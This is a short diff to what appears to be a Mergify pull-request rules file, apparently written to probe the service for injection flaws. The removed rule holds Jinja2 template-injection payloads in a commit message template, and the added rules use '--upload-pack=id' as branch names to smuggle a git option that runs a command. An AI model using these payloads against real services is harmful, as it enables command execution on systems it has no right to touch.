@@ -4,13 +4,17 @@ queue_rules:
       - base=main
 
 pull_request_rules:
-  - name: probe-merge-template
+  - name: probe-copy-dash
     conditions:
-      - label=probe-merge
+      - label=probe-copy
     actions:
-      merge:
-        method: squash
-        commit_message_template: |
-          {{ title }}
-          arith={{ 7*7 }}
-          ssti={{ cycler.__init__.__globals__ }}
+      copy:
+        branches:
+          - "--upload-pack=id"
+  - name: probe-backport-nested
+    conditions:
+      - label=probe-nested
+    actions:
+      backport:
+        branches:
+          - "refs/heads/--upload-pack=id"
